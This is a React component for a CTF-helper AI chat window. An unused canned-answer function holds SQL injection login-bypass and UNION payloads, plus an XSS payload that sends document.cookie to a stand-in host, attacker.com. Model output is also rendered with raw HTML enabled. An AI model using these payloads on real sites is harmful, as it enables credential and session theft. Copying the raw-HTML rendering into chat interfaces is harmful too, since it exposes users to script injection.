import { useState, useRef, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { Card, CardContent, CardFooter, CardHeader } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Skeleton } from "@/components/ui/skeleton";
import { Loader2, SendIcon, InfoIcon, Maximize2Icon, Minimize2Icon } from "lucide-react";
import { useAuth } from "@/hooks/use-auth";
import { useToast } from "@/hooks/use-toast";
import { Switch } from "@/components/ui/switch";
import { Label } from "@/components/ui/label";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import rehypeRaw from "rehype-raw";
import { Prism as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomDark } from "react-syntax-highlighter/dist/esm/styles/prism";

interface ChatMessage {
  role: 'system' | 'user' | 'assistant';
  content: string;
  isStreaming?: boolean;
}

interface ChatProvider {
  id: string;
  name: string;
  icon: string;
  available: boolean;
}

interface ChatWindowProps {
  provider: ChatProvider;
  apiKeysAvailable?: boolean;
  chatHistory?: any[];
  historyLoading?: boolean;
}

export default function ChatWindow({ provider, apiKeysAvailable = false, chatHistory = [], historyLoading = false }: ChatWindowProps) {
  const { user } = useAuth();
  const { toast } = useToast();
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [input, setInput] = useState('');
  const [isSaveDialogOpen, setIsSaveDialogOpen] = useState(false);
  const [streamingEnabled, setStreamingEnabled] = useState(true);
  const [isStreaming, setIsStreaming] = useState(false);
  const [streamingContent, setStreamingContent] = useState('');
  const [isExpanded, setIsExpanded] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  // Initial system message
  useEffect(() => {
    if (provider.available) {
      setMessages([
        {
          role: 'system',
          content: `Hi there! I'm your ${provider.name} for CTF challenges. How can I help you today?`
        }
      ]);
    } else {
      setMessages([]);
    }
  }, [provider]);

  // Auto-scroll to bottom of messages
  useEffect(() => {
    if (messagesEndRef.current) {
      messagesEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [messages]);

  // Chat completion mutation
  const chatCompletionMutation = useMutation({
    mutationFn: async (userMessage: string) => {
      // Create chat messages array with user's new message
      const messageArray = [...messages, { role: 'user', content: userMessage }];
      
      // If streaming is enabled, use SSE
      if (streamingEnabled && provider.id === "openai") {
        setIsStreaming(true);
        setStreamingContent('');
        
        // Add a placeholder message for the streaming response
        setMessages(prev => [
          ...prev, 
          { 
            role: 'assistant', 
            content: '',
            isStreaming: true
          }
        ]);
        
        // Make API call with streaming
        const res = await fetch('/api/chatbot/completion', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            provider: provider.id,
            messages: messageArray.filter(msg => msg.role !== 'system'),
            stream: true
          }),
        });
        
        // Set up the event source reader
        const reader = res.body?.getReader();
        const decoder = new TextDecoder();
        
        if (!reader) {
          throw new Error("Failed to create stream reader");
        }
        
        return new Promise((resolve, reject) => {
          let fullContent = '';
          
          async function readStream() {
            try {
              const { done, value } = await reader.read();
              
              if (done) {
                // Streaming complete
                // Save to chat history
                apiRequest("POST", "/api/chatbot/history", {
                  provider: provider.id,
                  messages: [...messageArray, { role: 'assistant', content: fullContent }],
                  title: userMessage.substring(0, 30) + "..."
                }).catch(console.error);
                
                resolve({ role: 'assistant', content: fullContent });
                return;
              }
              
              // Process the chunk
              const chunk = decoder.decode(value, { stream: true });
              const lines = chunk.split('\n\n').filter(line => line.trim() !== '');
              
              for (const line of lines) {
                if (line.startsWith('data: ')) {
                  try {
                    const data = JSON.parse(line.substring(6));
                    
                    if (data.error) {
                      reject(new Error(data.error));
                      return;
                    }
                    
                    if (data.done) {
                      // Streaming complete
                      // Save to chat history
                      apiRequest("POST", "/api/chatbot/history", {
                        provider: provider.id,
                        messages: [...messageArray, { role: 'assistant', content: fullContent }],
                        title: userMessage.substring(0, 30) + "..."
                      }).catch(console.error);
                      
                      resolve({ role: 'assistant', content: fullContent });
                      return;
                    }
                    
                    // Update the streaming content
                    if (data.content) {
                      fullContent = data.fullContent || (fullContent + data.content);
                      
                      // Update the streaming message
                      setMessages(prev => {
                        const newMessages = [...prev];
                        const lastMessage = newMessages[newMessages.length - 1];
                        if (lastMessage && lastMessage.isStreaming) {
                          lastMessage.content = fullContent;
                        }
                        return newMessages;
                      });
                    }
                  } catch (error) {
                    console.error("Error parsing SSE data:", error);
                  }
                }
              }
              
              // Continue reading
              readStream();
            } catch (error) {
              console.error("Error reading stream:", error);
              reject(error);
            }
          }
          
          readStream();
        });
      } else {
        // Regular API call for non-streaming
        const res = await apiRequest("POST", "/api/chatbot/completion", {
          provider: provider.id,
          messages: messageArray.filter(msg => msg.role !== 'system') // Remove system messages for API
        });
        
        const responseData = await res.json();
        
        // Check if there was an error
        if (!res.ok) {
          throw new Error(responseData.message || "Failed to generate completion");
        }
        
        // Save to chat history
        await apiRequest("POST", "/api/chatbot/history", {
          provider: provider.id,
          messages: [...messageArray, responseData.message],
          title: userMessage.substring(0, 30) + "..."
        });
        
        // Return the actual AI response
        return responseData.message;
      }
    },
    onSuccess: (response) => {
      // If we were streaming, the message is already in the state
      // Just update the isStreaming flag
      if (isStreaming) {
        setMessages(prev => {
          const newMessages = [...prev];
          const lastMessage = newMessages[newMessages.length - 1];
          if (lastMessage && lastMessage.isStreaming) {
            lastMessage.isStreaming = false;
          }
          return newMessages;
        });
        setIsStreaming(false);
      } else {
        // For non-streaming, add the new message
        setMessages(prev => [...prev, response]);
      }
      setInput('');
    },
    onError: (error: any) => {
      // If we were streaming, remove the streaming message
      if (isStreaming) {
        setMessages(prev => prev.filter(msg => !msg.isStreaming));
        setIsStreaming(false);
      }
      
      // Add the error message to the chat as a system message
      setMessages(prev => [
        ...prev, 
        { 
          role: 'system', 
          content: `Error: ${error.message || "Failed to generate completion. Please check your API key and try again."}`
        }
      ]);
      
      toast({
        title: "Error getting AI response",
        description: error.message || "Failed to generate completion. Please check your API key and try again.",
        variant: "destructive"
      });
    }
  });

  // Handle sending a message
  const handleSendMessage = () => {
    if (!input.trim()) return;
    if (!provider.available) {
      toast({
        title: "API Key Required",
        description: "Please add an API key for this provider before sending messages.",
        variant: "destructive"
      });
      return;
    }

    const userMessage = input.trim();
    setMessages(prev => [...prev, { role: 'user', content: userMessage }]);
    setInput('');
    chatCompletionMutation.mutate(userMessage);
  };

  // Handle pressing Enter to send (but Shift+Enter for new line)
  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      handleSendMessage();
    }
  };

  // Render the code block with syntax highlighting
  const renderMessageContent = (content: string, isStreaming: boolean = false) => {
    // Check if this is an error message
    if (content.startsWith('Error:')) {
      return (
        <div className="bg-red-900/20 border border-red-500 rounded-md p-3 text-red-400">
          <div className="flex items-center mb-2">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mr-2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
            <span className="font-medium">API Error</span>
          </div>
          <p>{content.substring(7)}</p>
          <div className="mt-3 text-xs">
            <span>Please check your API key in the settings or try a different provider.</span>
          </div>
        </div>
      );
    }
    
    // If streaming, show the content with a cursor
    if (isStreaming) {
      return (
        <div className="prose prose-invert max-w-none">
          <ReactMarkdown
            remarkPlugins={[remarkGfm]}
            rehypePlugins={[rehypeRaw]}
            components={{
              code({node, inline, className, children, ...props}) {
                const match = /language-(\w+)/.exec(className || '');
                return !inline && match ? (
                  <SyntaxHighlighter
                    style={atomDark}
                    language={match[1]}
                    PreTag="div"
                    {...props}
                  >
                    {String(children).replace(/\n$/, '')}
                  </SyntaxHighlighter>
                ) : (
                  <code className={className} {...props}>
                    {children}
                  </code>
                );
              }
            }}
          >
            {content}
          </ReactMarkdown>
          <span className="animate-pulse ml-1">▌</span>
        </div>
      );
    }
    
    // Use ReactMarkdown for rendering
    return (
      <div className="prose prose-invert max-w-none">
        <ReactMarkdown
          remarkPlugins={[remarkGfm]}
          rehypePlugins={[rehypeRaw]}
          components={{
            code({node, inline, className, children, ...props}) {
              const match = /language-(\w+)/.exec(className || '');
              return !inline && match ? (
                <SyntaxHighlighter
                  style={atomDark}
                  language={match[1]}
                  PreTag="div"
                  {...props}
                >
                  {String(children).replace(/\n$/, '')}
                </SyntaxHighlighter>
              ) : (
                <code className={className} {...props}>
                  {children}
                </code>
              );
            }
          }}
        >
          {content}
        </ReactMarkdown>
      </div>
    );
  };

  // Simulate AI responses for the demo
  const simulateAIResponse = (userMessage: string, providerId: string) => {
    const lowerMessage = userMessage.toLowerCase();
    
    // Basic SQL Injection response
    if (lowerMessage.includes('sql') || lowerMessage.includes('injection')) {
      return `
SQL injection occurs when user input is directly incorporated into SQL queries without proper sanitization.

For login forms, a common technique is to use the following in the username field:
\`\`\`sql
admin' --
\`\`\`

This might trick the application into executing:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
\`\`\`

The \`--\` comments out the rest of the query, so the password check is ignored.

For more advanced exploits, you can use UNION attacks:
\`\`\`sql
admin' UNION SELECT username, password FROM users --
\`\`\`

This could potentially return all usernames and passwords in the database.

For ethical hacking, always practice on systems you have permission to test!
      `;
    }
    
    // XSS response
    if (lowerMessage.includes('xss') || lowerMessage.includes('cross-site')) {
      return `
Cross-Site Scripting (XSS) allows attackers to inject client-side scripts into web pages viewed by other users.

There are several types:
1. **Reflected XSS**: The malicious script comes from the current HTTP request
2. **Stored XSS**: The malicious script is stored on the target server
3. **DOM-based XSS**: The vulnerability exists in client-side code

Basic XSS payload example:
\`\`\`javascript
<script>alert('XSS');</script>
\`\`\`

More advanced payload to steal cookies:
\`\`\`javascript
<script>
  fetch('https://attacker.com/steal?cookie='+document.cookie)
</script>
\`\`\`

To protect against XSS:
- Sanitize user input
- Implement Content Security Policy (CSP)
- Use HttpOnly cookies
- Encode output to HTML entities

For CTF challenges, look for input fields that reflect your input without proper sanitization.
      `;
    }
    
    // General hacking help
    return `
I'd be happy to help with your CTF challenge! Here are some general tips:

1. **Reconnaissance**: Gather as much information as possible about the target
   - Check page source code for comments or hidden fields
   - Look at HTTP headers and cookies
   - Run tools like nmap, dirb, or gobuster to discover endpoints

2. **Common vulnerabilities to check**:
   - SQL Injection
   - Cross-Site Scripting (XSS)
   - Local/Remote File Inclusion
   - Command Injection
   - Insecure Deserialization
   - Authentication bypasses

3. **For cryptography challenges**:
   - Identify the encryption method (look for patterns)
   - Try common tools like CyberChef
   - Check for weak keys or initialization vectors

4. **For web challenges**:
   - Use browser dev tools extensively
   - Check all HTTP requests in the Network tab
   - Try manipulating parameters and cookies

5. **For binary exploitation**:
   - Use tools like Ghidra or IDA Pro to analyze the code
   - Look for buffer overflows, format string vulnerabilities
   - Try common techniques like ret2libc or ROP chains

Can you provide more specific details about the challenge you're working on?
    `;
  };
  


  return (
    <Card className={`flex flex-col transition-all duration-300 ${
      isExpanded 
        ? 'fixed top-0 left-0 right-0 bottom-0 z-50 rounded-none h-screen w-screen' 
        : 'h-[600px]'
    }`}>
      {/* Chat Header */}
      <CardHeader className="border-b border-border p-4 flex-shrink-0">
        <div className="flex items-center justify-between">
          <div className="flex items-center">
            <div className="w-10 h-10 rounded-full bg-primary/20 flex items-center justify-center mr-3">
              <span dangerouslySetInnerHTML={{ __html: provider.icon }} className="text-primary" />
            </div>
            <div>
              <h3 className="font-medium text-white">{provider.name}</h3>
              <p className="text-muted-foreground text-xs">AI assistant for CTF</p>
            </div>
          </div>
          
          <div className="flex items-center space-x-2">
            <Button 
              variant="ghost" 
              size="icon" 
              onClick={() => setIsExpanded(!isExpanded)}
              title={isExpanded ? "Minimize chat" : "Expand chat"}
            >
              {isExpanded ? (
                <Minimize2Icon className="text-muted-foreground hover:text-primary h-5 w-5" />
              ) : (
                <Maximize2Icon className="text-muted-foreground hover:text-primary h-5 w-5" />
              )}
            </Button>
            <Button variant="ghost" size="icon">
              <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-muted-foreground hover:text-primary"><path d="M3 6h18"></path><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"></path><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"></path><line x1="10" x2="10" y1="11" y2="17"></line><line x1="14" x2="14" y1="11" y2="17"></line></svg>
            </Button>
          </div>
        </div>
      </CardHeader>
      
      {/* Chat Messages */}
      <CardContent className="flex-1 overflow-y-auto p-4 space-y-4 scrollbar-hide">
        {messages.map((message, index) => (
          <div 
            key={index} 
            className={`flex ${message.role === 'user' ? 'justify-end' : 'justify-start'}`}
          >
            <div 
              className={`rounded-lg p-4 max-w-[90%] ${
                message.role === 'user' 
                  ? 'bg-primary/10 border border-primary shadow-sm' 
                  : message.role === 'system'
                    ? 'bg-secondary/30 border border-secondary shadow-sm'
                    : 'bg-background border border-border shadow-sm'
              }`}
            >
              {message.role !== 'user' && (
                <div className="flex items-center mb-2">
                  <div className="w-6 h-6 rounded-full bg-primary/20 flex items-center justify-center mr-2">
                    <span dangerouslySetInnerHTML={{ __html: provider.icon }} className="text-primary text-xs" />
                  </div>
                  <span className="text-xs font-medium text-muted-foreground">
                    {message.role === 'system' ? 'System' : provider.name}
                  </span>
                </div>
              )}
              <div className="text-foreground text-sm">
                {renderMessageContent(message.content, message.isStreaming)}
              </div>
            </div>
          </div>
        ))}
        
        {chatCompletionMutation.isPending && (
          <div className="flex justify-start">
            <div className="bg-background border border-border rounded-lg p-4 shadow-sm">
              <div className="flex items-center space-x-2">
                <Loader2 className="h-4 w-4 animate-spin text-primary" />
                <p className="text-sm text-muted-foreground">Generating response...</p>
              </div>
            </div>
          </div>
        )}
        
        <div ref={messagesEndRef} />
      </CardContent>
      
      {/* Chat Input */}
      <CardFooter className="border-t border-border p-4">
        <div className="flex flex-col w-full">
          <div className="flex items-center w-full">
            <Textarea
              rows={1}
              placeholder="Ask me anything about CTF challenges..."
              className="flex-1 bg-background border border-border rounded-md p-3 text-foreground focus-visible:ring-primary resize-none min-h-[60px]"
              value={input}
              onChange={(e) => setInput(e.target.value)}
              onKeyDown={handleKeyDown}
              disabled={chatCompletionMutation.isPending}
            />
            <Button
              className="ml-2 p-3 h-[60px] w-[60px]"
              disabled={!input.trim() || chatCompletionMutation.isPending}
              onClick={handleSendMessage}
            >
              <SendIcon className="h-5 w-5" />
            </Button>
          </div>
          <div className="flex justify-between items-center mt-2 text-xs text-muted-foreground">
            <div className="flex items-center space-x-2">
              <Switch
                id="streaming-mode"
                checked={streamingEnabled}
                onCheckedChange={setStreamingEnabled}
                className="h-4 w-7 data-[state=checked]:bg-primary"
              />
              <Label htmlFor="streaming-mode" className="text-xs cursor-pointer">
                Real-time typing
              </Label>
            </div>
            <span>🔒 Your conversations are secure</span>
          </div>
        </div>
      </CardFooter>

      {/* Chat History - Moved from sidebar to bottom of chat window */}
      <div className="border-t border-border p-4">
        <h3 className="font-medium text-white text-sm mb-3">Recent Conversations</h3>
        <div className="flex flex-wrap gap-2">
          {historyLoading ? (
            <>
              <div className="w-full flex space-x-2">
                <Skeleton className="h-8 w-1/3" />
                <Skeleton className="h-8 w-1/3" />
                <Skeleton className="h-8 w-1/3" />
              </div>
            </>
          ) : chatHistory && chatHistory.length > 0 ? (
            chatHistory.slice(0, 5).map((chat: any) => (
              <a 
                key={chat.id} 
                href="#" 
                className="px-3 py-2 bg-secondary/30 hover:bg-secondary/50 rounded-md text-muted-foreground hover:text-primary text-sm flex items-center transition-colors"
              >
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="inline-block mr-2"><path d="M14 9a2 2 0 0 1-2 2H6l-4 4V4c0-1.1.9-2 2-2h8a2 2 0 0 1 2 2v5Z"/><path d="M18 9h2a2 2 0 0 1 2 2v11l-4-4h-6a2 2 0 0 1-2-2v-1"/></svg>
                {chat.title || `Chat ${new Date(chat.createdAt).toLocaleDateString()}`}
              </a>
            ))
          ) : (
            <p className="text-center text-muted-foreground text-sm py-2 w-full">No chat history yet</p>
          )}
        </div>
      </div>
    </Card>
  );
}
